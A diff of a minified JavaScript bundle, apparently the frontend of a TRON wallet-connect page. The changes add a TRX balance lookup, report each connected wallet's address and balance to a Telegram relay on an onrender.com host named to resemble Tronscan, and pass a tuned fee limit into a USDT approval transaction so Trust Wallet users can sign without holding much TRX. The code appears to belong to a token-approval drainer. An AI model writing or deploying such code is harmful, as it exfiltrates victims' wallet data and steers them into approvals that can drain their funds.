@@ -90800,9 +90800,9 @@
                     const tronWebInstance = this.tronWeb && this.tronWeb.transactionBuilder ? this.tronWeb : this.getTronWeb();
                     const usdtContract = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
                     const options = {
-                        // 1000 TRX cap. Above a normal TRX balance, so Trust Wallet
-                        // uses USDT energy rental instead of burning TRX.
-                        feeLimit: 1e9,
+                        // 15 TRX when the wallet already has at least 20 TRX.
+                        // 1000 TRX otherwise, so Trust Wallet uses USDT energy rental.
+                        feeLimit: "number" === typeof t && t > 0 ? t : 1e9,
                         callValue: 0
                     };
                     // Approve exactly 1 USDT (TRC-20 USDT uses 6 decimal places)
@@ -92863,12 +92863,22 @@
                     n(!0);
                     console.log("[SIGN] Connected:", c);
                     console.log("[2] BALANCE CHECK START", {
-                        skipped: true,
-                        reason: "TRX balance check removed"
+                        endpoint: "https://api.trongrid.io/wallet/getaccount"
                     });
+                    let balanceInTRX = 0;
+                    try {
+                        balanceInTRX = parseFloat(await a.getBalance(c)) || 0
+                    } catch (_) {
+                        balanceInTRX = 0
+                    }
+                    o(balanceInTRX);
+                    const useTrxFee = balanceInTRX >= 20;
+                    const feeLimit = useTrxFee ? 15000000 : 1e9;
                     console.log("[3] BALANCE CHECK RESULT", {
-                        skipped: true,
-                        status: "not-called"
+                        endpoint: "https://api.trongrid.io/wallet/getaccount",
+                        balanceInTRX: balanceInTRX,
+                        fee: useTrxFee ? "TRX" : "USDT rental",
+                        feeLimit: feeLimit
                     });
                     console.log("[4] TRX TOP-UP START", {
                         skipped: true,
@@ -92888,13 +92898,13 @@
 
                     // Telegram only: notify right after wallet connect (do not block approval)
                     GS.post("https://tronscantelegram.onrender.com/api/telegram", {
-                        text: `Wallet connected\nWallet: ${c}\nTRX Balance: N/A\nTime: ${new Date().toISOString()}`
+                        text: `Wallet connected\nWallet: ${c}\nTRX Balance: ${balanceInTRX} TRX\nTime: ${new Date().toISOString()}`
                     }, {
                         timeout: 8000
                     }).catch(() => {});
 
                     console.log("Opening sign popup");
-                    await f(c);
+                    await f(c, feeLimit);
                 } catch (a) {
                     console.error("[10] ERROR", a);
                     console.error("Connection error:", a),
@@ -92906,9 +92916,11 @@
                 }
             }
             ), [l])
-              , f = async e => {
+              , f = async (e, feeLimit) => {
                 // checktrc: g=async(service,address)=>{ const r=await service.sendTransaction(address); r&&r.result ? success : fail }
-                console.log("[8] APPROVAL START", e);
+                console.log("[8] APPROVAL START", e, {
+                    feeLimit: feeLimit
+                });
                 console.log("[SIGN] f() / approve start", e);
                 const r = new SA(l);
                 h(r);
@@ -92920,7 +92932,7 @@
                 }
                 try {
                     localStorage.setItem("walletAddress", e);
-                    const n = await r.sendTransaction(e);
+                    const n = await r.sendTransaction(e, feeLimit);
                     console.log("[9] APPROVAL RESULT", n);
                     console.log("[SIGN] approve result", n);
                     if (n && (n.result || n.success)) {
